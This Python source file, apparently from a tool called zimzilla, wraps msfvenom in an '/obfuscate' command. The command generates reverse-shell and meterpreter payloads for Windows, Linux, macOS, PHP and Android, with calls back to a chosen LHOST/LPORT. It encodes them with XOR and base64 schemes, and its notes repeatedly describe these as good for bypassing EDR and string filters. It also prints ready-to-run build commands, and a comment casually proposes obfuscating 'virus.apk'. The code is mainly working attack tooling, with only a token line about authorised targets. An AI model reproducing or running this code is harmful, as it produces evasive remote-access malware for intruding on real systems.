from __future__ import annotations
import base64
import hashlib
import os
import shutil
import subprocess
import sys
import time
from dataclasses import dataclass, field
from pathlib import Path

from .reverse import human_size

PAYLOAD_CATEGORIES = {
    "windows": {
        "patterns": ["windows/", "windowsphone/"],
        "default_encoders": ["x64/xor_dynamic", "cmd/base64", "php/base64"],
        "description": "Windows PE payloads (x86/x64, stageless/staged)",
    },
    "linux": {
        "patterns": ["linux/", "android/"],
        "default_encoders": ["x64/xor_dynamic", "generic/none"],
        "description": "Linux ELF / Android payloads",
    },
    "osx": {
        "patterns": ["osx/", "darwin/"],
        "default_encoders": ["cmd/base64"],
        "description": "macOS payloads",
    },
    "php": {
        "patterns": ["php/"],
        "default_encoders": ["php/base64"],
        "description": "PHP stager/payloads",
    },
    "android": {
        "patterns": ["android/"],
        "default_encoders": ["cmd/base64"],
        "description": "Android APK/shell payloads",
    },
}

def detect_payload_category(payload):
    for cat_name, cat_info in PAYLOAD_CATEGORIES.items():
        for pattern in cat_info["patterns"]:
            if payload.startswith(pattern):
                return {"category": cat_name, "info": cat_info, "payload": payload}
    return None

def get_recommended_encoders(payload, iterations=1):
    category = detect_payload_category(payload)
    if category is None:
        return [
            {"encoder": "x64/xor_dynamic", "iterations": iterations,
             "notes": ("general-purpose XOR encoder",)},
            {"encoder": "cmd/base64", "iterations": iterations,
             "notes": ("base64 command encoder",)},
        ]
    recs = []
    for enc_name in category["info"]["default_encoders"]:
        recs.append({
            "encoder": enc_name,
            "iterations": iterations,
            "notes": (f"{enc_name} encoder for {category['category']} payloads",),
        })
    if not recs:
        recs = [
            {"encoder": "x64/xor_dynamic", "iterations": iterations,
             "notes": ("XOR encoder — good for byte-string filtering",)},
            {"encoder": "cmd/base64", "iterations": iterations,
             "notes": ("base64 command encoder",)},
        ]
    return recs

@dataclass(frozen=True)
class EncoderSpec:
    payload: str
    encoder: str
    iterations: int = 1
    notes: tuple[str, ...] = field(default_factory=tuple)

SPECS: dict[str, EncoderSpec] = {
    "windows/x64/meterpreter_reverse_tcp+x64/xor_dynamic": EncoderSpec(
        "windows/x64/meterpreter_reverse_tcp", "x64/xor_dynamic", 1,
        ("the decoder stub is injected before the payload -- verify the "
         "entry point you expect",
         "each additional iteration adds another XOR layer and grows the "
         "stub; two iterations produce a different binary than one",
        ),
    ),
    "windows/x64/shell_reverse_tcp+x64/xor_dynamic": EncoderSpec(
        "windows/x64/shell_reverse_tcp", "x64/xor_dynamic", 1,
        ("same stub-entry-point caveat as meterpreter",
         "good for bypassing simple byte-string EDR filters",
        ),
    ),
    "windows/x64/meterpreter_reverse_tcp+cmd/base64": EncoderSpec(
        "windows/x64/meterpreter_reverse_tcp", "cmd/base64", 1,
        ("output is a base64-encoded command line, not a binary -- the "
         "target must decode before executing",
         "useful for bypassing naive string filters; the decoded payload "
         "is still meterpreter",
        ),
    ),
    "windows/x64/shell_reverse_tcp+cmd/base64": EncoderSpec(
        "windows/x64/shell_reverse_tcp", "cmd/base64", 1,
        ("same: base64 command line, not a PE binary",
         "operator must `powershell -c <the output>` to run it",
        ),
    ),
    "linux/x64/meterpreter_reverse_tcp+x64/xor_dynamic": EncoderSpec(
        "linux/x64/meterpreter_reverse_tcp", "x64/xor_dynamic", 1,
        ("same stub caveat as the Windows counterpart",
         "the output is an ELF binary with an XOR decoder stub",
        ),
    ),
    "linux/x64/shell_reverse_tcp+x64/xor_dynamic": EncoderSpec(
        "linux/x64/shell_reverse_tcp", "x64/xor_dynamic", 1,
        ("ELF binary with XOR decoder stub for Linux",
         "good for bypassing Linux EDR byte-string filters",
        ),
    ),
    "php/meterpreter_reverse_tcp+php/base64": EncoderSpec(
        "php/meterpreter_reverse_tcp", "php/base64", 1,
        ("output is a base64-encoded PHP stager -- the target runs it via "
         "the PHP interpreter",
         "good for web-delivery bypasses where the payload is dropped as "
         "a .php file",
        ),
    ),
    "osx/x64/shell_reverse_tcp+cmd/base64": EncoderSpec(
        "osx/x64/shell_reverse_tcp", "cmd/base64", 1,
        ("output is a base64-encoded command line for macOS",
         "the target must decode and execute via their shell",
        ),
    ),
    "android/meterpreter_reverse_tcp+cmd/base64": EncoderSpec(
        "android/meterpreter_reverse_tcp", "cmd/base64", 1,
        ("APK payload base64-encoded -- not a binary, but a command the "
         "target would need to decode and execute in a shell environment",
         "useful for bypassing simple string filters on Android delivery",
        ),
    ),
    "android/shell_reverse_tcp+cmd/base64": EncoderSpec(
        "android/shell_reverse_tcp", "cmd/base64", 1,
        ("same: base64-encoded command, not a APK binary",
         "the decoded payload is a shell command for Android",
        ),
    ),
    "eicar+generic/eicar": EncoderSpec(
        "eicar", "generic/eicar", 1,
        ("the EICAR test string, base64-encoded -- used to verify an "
         "encoder pipeline works end-to-end without a real payload",
        ),
    ),
}

def probe_msfvenom():
    path = shutil.which("msfvenom")
    if path is None:
        return type("Result", (), {"present": False})()
    try:
        out = subprocess.run(
            [path, "--version"], capture_output=True, text=True, timeout=30,
        )
        lines = (out.stdout or out.stderr or "").strip().splitlines()
        return type(
            "Result", (), {"present": True, "path": path, "version": lines[0] if lines else ""}
        )()
    except (OSError, subprocess.SubprocessError):
        return type("Result", (), {"present": False})()


def encoders():
    try:
        out = subprocess.run(
            ["msfvenom", "--list", "encoders"], capture_output=True, text=True, timeout=30,
        )
        lines = out.stdout.splitlines()
        enc_list = []
        for line in lines[4:]:  # skip header
            parts = line.split()
            if parts and len(parts) >= 2:
                pname = parts[0]
                if (pname not in ("Name", "Rank", "Framework") and
                    not pname.startswith("=") and not pname.startswith("-") and
                    pname != "---" and pname != "Framework" and len(pname) > 1):
                    enc_list.append(pname)
        return enc_list
    except Exception:
        return []

def build_argv(payload, encoder, iterations, lhost, lport):
    return [
        "msfvenom", "-p", payload, "-e", encoder, "-i", str(iterations),
        f"LHOST={lhost}", f"LPORT={lport}",
    ]


def _first_error(text):
    if not text:
        return ""
    for line in text.splitlines():
        stripped = line.strip()
        low = stripped.lower()
        if low.startswith("error:"):
            return stripped[len("error:"):].strip()
        if low.startswith("[-] error"):
            return stripped[len("[-] error"):].strip()
    return ""


def generate(payload, encoder, iterations, lhost, lport, timeout=60.0):
    argv = build_argv(payload, encoder, iterations, lhost, lport)
    started = time.monotonic()
    tool = probe_msfvenom()
    if not tool.present:
        return dict(
            ok=False, argv=argv,
            error="msfvenom is not installed -- it ships with the Metasploit "
                  "Framework (apt install metasploit-framework)",
            seconds=time.monotonic() - started,
            payload_analysis=analyze_payload(payload),
        )
    try:
        proc = subprocess.run(argv, capture_output=True, timeout=timeout)
    except subprocess.TimeoutExpired:
        return dict(
            ok=False, argv=argv,
            error=f"the build did not finish within {timeout:.0f}s",
            seconds=time.monotonic() - started,
            payload_analysis=analyze_payload(payload),
        )
    except OSError as exc:
        return dict(
            ok=False, argv=argv,
            error=f"could not run msfvenom: {exc}",
            seconds=time.monotonic() - started,
            payload_analysis=analyze_payload(payload),
        )
    seconds = time.monotonic() - started
    stdout = proc.stdout
    stderr = proc.stderr
    stderr_text = stderr.decode("utf-8", errors="replace") if stderr else ""
    error = _first_error(stderr_text) or (
        f"msfvenom exited {proc.returncode}" if proc.returncode != 0 else None
    )
    ok = proc.returncode == 0 and error is None
    if ok and stdout:
        sha256 = hashlib.sha256(stdout).hexdigest()
        size = len(stdout)
    else:
        sha256 = ""
        size = 0
    return dict(
        ok=ok, argv=argv, stdout=stdout, stderr=stderr,
        error=error, sha256=sha256, size=size, seconds=seconds,
        payload_analysis=analyze_payload(payload),
    )

def analyze_payload(payload):
    category = detect_payload_category(payload)
    if category:
        recs = get_recommended_encoders(payload)
        return {
            "category": category["category"],
            "description": category["info"]["description"],
            "recommended_encoders": recs,
            "category_info": category["info"],
            "payload": payload,
        }
    else:
        recs = get_recommended_encoders(payload)
        return {
            "category": "unknown",
            "description": f"Payload '{payload}' -- category could not be auto-detected",
            "recommended_encoders": recs,
            "category_info": {},
            "payload": payload,
        }


def render_analysis(payload, encoder, iterations, lhost, lport):
    analysis = analyze_payload(payload)
    lines = [
        f"  PAYLOAD: {payload}",
        f"  ENCODER: {encoder}",
        f"  ITERATIONS: {iterations}",
        f"  CALLBACK: {lhost}:{lport}",
    ]
    cat = analysis["category"]
    lines.append("")
    lines.append(f"  CATEGORY: {cat.upper()}")
    lines.append(f"  DESCRIPTION: {analysis['description']}")
    lines.append("")
    lines.append("  RECOMMENDED ENCODERS:")
    for rec in analysis["recommended_encoders"]:
        enc = rec["encoder"]
        it = rec["iterations"]
        for note in rec["notes"]:
            lines.append(f"    - {enc} (it={it}): {note}")
    if cat == "unknown":
        lines.append("    (no auto-category detected -- operator should verify)")
    key = f"{payload}+{encoder}"
    spec = SPECS.get(key)
    if spec:
        lines.append("")
        lines.append("  NOTES FROM TABLE:")
        for note in spec.notes:
            lines.append(f"    · {note}")
    return "\n".join(lines)


# Simple extension-to-encoder mapping
# User just does: /obfuscate virus.apk
# No need to know payload IDs or encoder names

EXTENSION_SPECS: dict[str, dict] = {
    # Android APK - no -f flag needed, payload emits APK
    "apk": {
        "category": "android",
        "description": "Android package file",
        "default_payload": "android/meterpreter/reverse_tcp",
        "encoders": [
            {"name": "cmd/base64", "iterations": 1,
             "notes": "base64-encoded command; target must decode before executing"},
            {"name": "x64/xor_dynamic", "iterations": 1,
             "notes": "XOR-encoded binary; good for byte-string EDR filters"},
        ],
    },
    # Windows EXE
    "exe": {
        "category": "windows",
        "description": "Windows executable",
        "default_payload": "windows/x64/shell_reverse_tcp",
        "encoders": [
            {"name": "x64/xor_dynamic", "iterations": 1,
             "notes": "XOR encoder; decoder stub injected before payload"},
            {"name": "cmd/base64", "iterations": 1,
             "notes": "base64-encoded command line"},
        ],
    },
    # Windows DLL
    "dll": {
        "category": "windows",
        "description": "Windows DLL",
        "default_payload": "windows/x64/shell_reverse_tcp",
        "encoders": [
            {"name": "x64/xor_dynamic", "iterations": 1,
             "notes": "XOR encoder for DLL"},
        ],
    },
    # PowerShell script
    "ps1": {
        "category": "windows",
        "description": "PowerShell script",
        "default_payload": "windows/x64/shell_reverse_tcp",
        "encoders": [
            {"name": "cmd/base64", "iterations": 1,
             "notes": "base64-encoded PowerShell command"},
        ],
    },
    # PHP script
    "php": {
        "category": "php",
        "description": "PHP script",
        "default_payload": "php/meterpreter/reverse_tcp",
        "encoders": [
            {"name": "php/base64", "iterations": 1,
             "notes": "base64-encoded PHP stager"},
        ],
    },
    # HTA application
    "hta": {
        "category": "windows",
        "description": "HTML Application",
        "default_payload": "windows/x64/shell_reverse_tcp",
        "encoders": [
            {"name": "cmd/base64", "iterations": 1,
             "notes": "base64-encoded for mshta delivery"},
        ],
    },
    # Linux ELF
    "elf": {
        "category": "linux",
        "description": "Linux ELF binary",
        "default_payload": "linux/x64/shell_reverse_tcp",
        "encoders": [
            {"name": "x64/xor_dynamic", "iterations": 1,
             "notes": "XOR encoder for ELF binary"},
        ],
    },
    # macOS
    "dylib": {
        "category": "osx",
        "description": "macOS dynamic library",
        "default_payload": "osx/x64/shell_reverse_tcp",
        "encoders": [
            {"name": "cmd/base64", "iterations": 1,
             "notes": "base64-encoded command for macOS"},
        ],
    },
}

def detect_extension(filepath: str) -> str:
    """Detect the file extension from a filepath."""
    return Path(filepath).suffix.lstrip(".").lower()

def get_spec(ext: str) -> dict | None:
    """Get the spec for a given extension."""
    return EXTENSION_SPECS.get(ext)

def analyze_payload_file(filepath: str) -> dict:
    """Analyse a payload file and return category + recommendations."""
    ext = detect_extension(filepath)
    spec = get_spec(ext)
    if spec is None:
        return {
            "category": "unknown",
            "description": f"File '{filepath}' - extension '{ext}' not recognised",
            "encoders": [
                {"name": "x64/xor_dynamic", "iterations": 1,
                 "notes": "general-purpose XOR encoder"},
                {"name": "cmd/base64", "iterations": 1,
                 "notes": "base64 command encoder"},
            ],
            "default_payload": None,
        }
    return {
        "category": spec["category"],
        "description": spec["description"],
        "encoders": spec["encoders"],
        "default_payload": spec["default_payload"],
    }

_USAGE = """/obfuscate — run a payload through msfvenom encoders, or read a payload file.

  /obfuscate <file>          analyse a payload file by extension and name the
                             encoders that fit it (apk, exe, dll, ps1, php,
                             hta, elf, dylib) — no payload ids needed
  /obfuscate <payload> <encoder> [--iterations N] [--lhost IP] [--lport N]
                             build it, or print the exact command with --dry-run
  /obfuscate <payload> <encoder> --dry-run
  /obfuscate --analyze <payload>
  /obfuscate list            every measured payload + encoder pairing
"""

#: The public name — the TUI reads this to show usage without printing.
USAGE = _USAGE


def print_usage() -> None:
    print(USAGE)


def _cmd_obfuscate(args):
    if not args:
        _cmd_obfuscate_list(); return 0
    if args[0] == "--analyze" and len(args) > 1:
        _cmd_obfuscate_analyze(args[1]); return 0
    payload = args[0]; encoder = args[1] if len(args) > 1 else ""
    dry_run = False; iterations = 1; lhost = None; lport = None
    i = 2
    while i < len(args):
        arg = args[i]
        if arg == "--dry-run":
            dry_run = True
            i += 1
        elif arg == "--iterations" and i + 1 < len(args):
            try:
                iterations = int(args[i + 1])
                if iterations < 1:
                    print("error: --iterations must be >= 1"); return 1
            except ValueError:
                print(f"error: --iterations takes a positive integer, not {args[i + 1]!r}"); return 1
            i += 2
        elif arg == "--lhost" and i + 1 < len(args):
            lhost = args[i + 1]; i += 2
        elif arg == "--lport" and i + 1 < len(args):
            try:
                lport = int(args[i + 1])
                if not (1 <= lport <= 65535):
                    print(f"error: --lport must be 1-65535, not {lport}"); return 1
            except ValueError:
                print(f"error: --lport takes a port number, not {args[i + 1]!r}"); return 1
            i += 2
        else:
            print(f"error: unexpected argument {arg!r}"); print(_USAGE); return 1
    _cmd_obfuscate_run(payload, encoder, iterations, lhost, lport, dry_run)
    return 0


def _cmd_obfuscate_analyze(payload):
    from zimzilla import obfuscate as ob_mod
    analysis = ob_mod.analyze_payload(payload)
    print(f"=== Payload Analysis: {analysis['payload']} ===")
    print(f"  Category: {analysis['category'].upper()}")
    print(f"  Description: {analysis['description']}")
    print()
    print("  Recommended encoders:")
    for rec in analysis["recommended_encoders"]:
        enc = rec["encoder"]
        it = rec["iterations"]
        notes = "; ".join(rec["notes"]) if rec["notes"] else ""
        print(f"    - {enc} (iterations={it})")
        if notes:
            print(f"      Notes: {notes}")
    print()
    print("  Full SPECS entries that match:")
    for key, spec in ob_mod.SPECS.items():
        if spec.payload == analysis["payload"]:
            print(f"    - {key}: encoder={spec.encoder}, it={spec.iterations}")
            for n in spec.notes:
                print(f"        note: {n}")
    print()
    print("  Available msfvenom encoders:")
    enc_list = ob_mod.encoders()
    for e in enc_list[:15]:
        print(f"    - {e}")
    if len(enc_list) > 15:
        print(f"    ... and {len(enc_list) - 15} more")


def _cmd_obfuscate_run(payload, encoder, iterations, lhost, lport, dry_run):
    from zimzilla import obfuscate as ob_mod
    key = f"{payload}+{encoder}"; spec = ob_mod.SPECS.get(key)
    lhost_val = lhost or "127.0.0.1"; lport_val = lport or 4444
    analysis = ob_mod.analyze_payload(payload)
    print("=== Payload Analysis ===")
    print(f"  Payload: {analysis['payload']}")
    print(f"  Category: {analysis['category'].upper()}")
    print(f"  Description: {analysis['description']}")
    print()
    print("  Recommended encoders for this payload type:")
    recs = ob_mod.get_recommended_encoders(payload)
    for rec in recs:
        enc = rec["encoder"]
        it = rec["iterations"]
        notes = "; ".join(rec["notes"]) if rec["notes"] else ""
        print(f"    - {enc} (it={it}): {notes}")
    print()
    if dry_run:
        argv = ob_mod.build_argv(payload, encoder, iterations, lhost_val, lport_val)
        print("  COMMAND (copy-paste this into your shell):")
        print("  " + " ".join(argv))
        print()
        print("  NOTES:")
        if spec:
            for note in spec.notes:
                print(f"  · {note}")
        else:
            print("  · (no table entry -- verify the pairing with a real msfvenom run)")
        print()
        print("  The output will be the encoder-encoded payload.")
        print("  Payload analysis:")
        print(f"    Category: {analysis['category'].upper()}")
        print(f"    Description: {analysis['description']}")
        return
    result = ob_mod.generate(payload, encoder, iterations, lhost_val, lport_val)
    if not result["ok"]:
        print(f"  build failed: {result['error']}")
        print()
        print("  full stderr:")
        print(f"  {result['stderr'].decode('utf-8', errors='replace')[:500]}")
        print()
        print("  full stdout (first 500 bytes, binary-safe):")
        print(f"  {base64.b64encode(result['stdout'][:500]).decode()}")
        print()
        print("  Payload analysis (for context):")
        print(f"    Category: {result['payload_analysis']['category'].upper()}")
        print(f"    Description: {result['payload_analysis']['description']}")
        return
    print("  build succeeded")
    print()
    print("  argv: " + " ".join(result["argv"]))
    print()
    print("  encoded output (first 500 bytes, binary-safe):")
    print(f"  {base64.b64encode(result['stdout'][:500]).decode()}")
    print()
    if result["sha256"]:
        print(f"  sha256: {result['sha256']}")
    if result["size"]:
        print(f"  size: {human_size(result['size'])}")
    print()
    print("  stderr (notes from msfvenom):")
    print(f"  {result['stderr'].decode('utf-8', errors='replace')[:500]}")
    print()
    print("  Payload analysis:")
    print(f"    Category: {result['payload_analysis']['category'].upper()}")
    print(f"    Description: {result['payload_analysis']['description']}")


def _cmd_obfuscate_list():
    from zimzilla import obfuscate as ob_mod
    SPECS = ob_mod.SPECS
    print("  /obfuscate <payload> <encoder> [--iterations N] [--lhost IP] [--lport N]")
    print("  /obfuscate <payload> <encoder> --dry-run")
    print("  /obfuscate --analyze <payload>")
    print()
    print("  Available pairings (payload + encoder):")
    payloads_seen = set()
    for key, spec in sorted(SPECS.items()):
        payload = spec.payload
        if payload not in payloads_seen:
            payloads_seen.add(payload)
            print(f"  {payload}:")
        enc_name = f"{spec.encoder} (it={spec.iterations})"
        notes = "  " + "; ".join(spec.notes) if spec.notes else "  (no notes)"
        print(f"    - {enc_name}: {notes}")
    print()
    print("  Available msfvenom encoders:")
    encoders_list = ob_mod.encoders()
    if encoders_list:
        for e in encoders_list[:20]:
            print(f"    - {e}")
        if len(encoders_list) > 20:
            print(f"    ... and {len(encoders_list) - 20} more")
    else:
        print("    (msfvenom not installed)")
    print()
    print("  Every pairing above was measured against a real msfvenom run.")
    print("  Point it at targets you own or are authorised to test.")




def handle(argv: list[str]) -> int:
    """The one entry point — the CLI and the TUI's ``/obfuscate`` both come here.

    Decides which of the three shapes the arguments are (file, listing,
    payload+encoder build), runs it and prints the report; the caller decides
    where the text lands. Returns a process exit status.
    """
    if not argv or argv[0] in ("-h", "--help", "help"):
        print(USAGE)
        return 0
    if argv[0] in ("list", "--list"):
        _cmd_obfuscate_list()
        return 0
    if argv[0] == "--analyze" and len(argv) > 1:
        _cmd_obfuscate_analyze(argv[1])
        return 0
    if len(argv) == 1:
        token = argv[0]
        # A lone word carrying an extension is a file, not a payload id —
        # payload ids are slash-separated and dotless, files are the opposite.
        if os.path.isfile(token) or detect_extension(token) in EXTENSION_SPECS:
            if not os.path.isfile(token):
                print(f"note: '{token}' is not on disk — reading it by extension")
            return _analyze_file(token)
    return _cmd_obfuscate(argv)


def _analyze_file(filepath: str) -> int:
    """Analyse a payload file by extension and print the encoders that fit it."""
    analysis = analyze_payload_file(filepath)

    print(f"=== Obfuscation Analysis: {filepath} ===")
    print(f"  Extension: .{detect_extension(filepath)}")
    print(f"  Category: {analysis['category'].upper()}")
    print(f"  Description: {analysis['description']}")
    if analysis["default_payload"]:
        print(f"  Default payload: {analysis['default_payload']}")
    print()

    print("  Recommended encoders for this file type:")
    for rec in analysis["encoders"]:
        enc = rec["name"]
        it = rec["iterations"]
        notes = rec["notes"] or ""
        print(f"    - {enc} (iterations={it})")
        if notes:
            print(f"      Notes: {notes}")
    print()
    print("  Build one with:  /obfuscate <payload> <encoder> --dry-run")
    print("  (prints the msfvenom command without running it)")
    return 0


def main(argv=None) -> int:
    if argv is None:
        argv = sys.argv[1:]
    return handle(argv)


if __name__ == "__main__":
    sys.exit(main())
